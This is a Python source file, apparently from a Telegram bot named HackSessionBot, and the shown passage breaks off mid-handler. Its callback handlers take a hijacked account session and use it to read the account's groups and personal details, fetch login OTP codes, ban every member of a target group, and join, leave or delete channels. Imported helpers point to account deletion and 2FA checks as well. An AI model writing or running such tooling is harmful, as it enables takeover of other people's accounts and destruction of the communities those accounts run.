import os
from HackSessionBot import app, API_ID, API_HASH
from HackSessionBot.Helpers.steve import (
    users_gc,
    user_info,
    banall,
    get_otp,
    join_ch,
    leave_ch,
    del_ch,
    check_2fa,
    terminate_all,
    del_acc,
    piromote,
    demote_all,
)
from HackSessionBot.Helpers.data import HACK_MODS
from pyrogram.types import CallbackQuery
from pyrogram.raw import functions
from telethon import TelegramClient, StringSession
from typing import Coroutine


@app.on_callback_query(filters.regex("A"))
async def a_callback(client: Client, query: CallbackQuery) -> None:
    chat_id = query.message.chat.id
    session = await get_session(client, chat_id)
    if not session:
        return
    ch = await users_gc(session)
    if len(ch) > 3855:
        await save_and_send_session(ch, client, chat_id)
    else:
        await send_message_and_markup(
            client,
            chat_id,
            ch + "\n\nThanks for using me, give a star to my [repo](https://github.com/SupremeStark/HackSessionBot)",
            HACK_MODS,
        )


@app.on_callback_query(filters.regex("B"))
async def b_callback(client: Client, query: CallbackQuery) -> None:
    id = query.message.chat.id
    session = await get_session(client, id)
    if not session:
        return
    info = await user_info(session)
    await send_message_and_markup(
        client,
        id,
        info + "\n\nThanks for using me, give a star to my [repo](https://github.com/SupremeStark/HackSessionBot)",
        HACK_MODS,
    )


@app.on_callback_query(filters.regex("C"))
async def c_callback(client: Client, query: CallbackQuery) -> None:
    id = query.message.chat.id
    session = await get_session(client, id)
    if not session:
        return
    gc = await get_input(client, id, "Now give me the group/channel id or username")
    if not gc:
        return
    hehe = await banall(session, gc)
    await send_message_and_markup(
        client,
        id,
        hehe + "\n\nThanks for using me, give a star to my [repo](https://github.com/SupremeStark/HackSessionBot)",
        HACK_MODS,
    )


@app.on_callback_query(filters.regex("D"))
async def d_callback(client: Client, query: CallbackQuery) -> None:
    id = query.message.chat.id
    session = await get_session(client, id)
    if not session:
        return
    hehe = await get_otp(session)
    await send_message_and_markup(
        client,
        id,
        hehe + "\n\nThanks for using me, give a star to my [repo](https://github.com/SupremeStark/HackSessionBot)",
        HACK_MODS,
    )


@app.on_callback_query(filters.regex("E"))
async def e_callback(client: Client, query: CallbackQuery) -> None:
    id = query.message.chat.id
    session = await get_session(client, id)
    if not session:
        return
    gc = await get_input(client, id, "Now give me the group/channel id or username")
    if not gc:
        return
    hehe = await join_ch(session, gc)
    await send_message_and_markup(
        client,
        id,
        hehe + "\n\nThanks for using me, give a star to my [repo](https://github.com/SupremeStark/HackSessionBot)",
        HACK_MODS,
    )


@app.on_callback_query(filters.regex("F"))
async def f_callback(client: Client, query: CallbackQuery) -> None:
    id = query.message.chat.id
    session = await get_session(client, id)
    if not session:
        return
    gc = await get_input(client, id, "Now give me the group/channel id or username")
    if not gc:
        return
    hehe = await leave_ch(session, gc)
    await send_message_and_markup(
        client,
        id,
        hehe + "\n\nThanks for using me, give a star to my [repo](https://github.com/SupremeStark/HackSessionBot)",
        HACK_MODS,
    )


@app.on_callback_query(filters.regex("G"))
async def g_callback(client: Client, query: CallbackQuery) -> None:
    id = query.message.chat.id
    session = await get_session(client, id)
    if not session:
        return
    gc = await get_input(client, id, "Now give me the group/channel id or username")
    if not gc:
        return
    hehe = await del_ch(session, gc)
    await send_message_and_markup(
        client,
